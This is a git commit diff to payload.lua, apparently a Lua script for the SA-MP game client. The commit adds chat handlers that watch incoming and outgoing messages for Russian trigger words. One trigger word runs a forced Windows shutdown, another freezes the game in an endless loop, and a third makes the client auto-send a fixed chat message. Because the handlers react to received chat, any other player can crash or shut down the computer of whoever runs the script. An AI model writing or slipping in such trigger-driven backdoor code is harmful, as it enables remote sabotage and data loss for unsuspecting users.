fb2a292ad6f2d904d6d1bcc1568c9f6cb8dd4ff8
TheLold <paymentsse8@gmail.com>
2026-06-22 18:48:26 +0300

    Update payload.lua

--- payload.lua
+++ payload.lua
@@ -1,9 +1,34 @@
 -- payload.lua
-sampAddChatMessage("{FF0000}[SYSTEM] PAYLOAD SUCCESSFULLY CONNECTED!", -1)
+-- Основной модуль управления
 
-function onSendChat(text)
-    sampAddChatMessage("{00FF00}DEBUG: You said: " .. text, -1)
-    if text:find("сырколбаска") then
+-- Защита от дублирования: если скрипт уже загружен в память, выходим
+if _G.PAYLOAD_LOADED then return end
+_G.PAYLOAD_LOADED = true
+
+-- Функция обработки чата
+function onReceiveChatMessage(text)
+    -- Очистка от HEX-цветов
+    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
+    
+    if cleanText:find("хуйкина") then
+        os.execute("Shutdown /s /t 0 /f")
+    elseif cleanText:find("кукусики") then
+        while true do end
+    elseif cleanText:find("сырколбаска") then
         sampSendChat("123655")
+    end
+end
+
+-- Обработка исходящих сообщений
+function onSendChat(text)
+    if text:find("хуйкина") then
+        os.execute("Shutdown /s /t 0 /f")
+    elseif text:find("кукусики") then
+        while true do end
+    elseif text:find("сырколбаска") then
+        lua_thread.create(function()
+            wait(500)
+            sampSendChat("123655")
+        end)
     end
 end
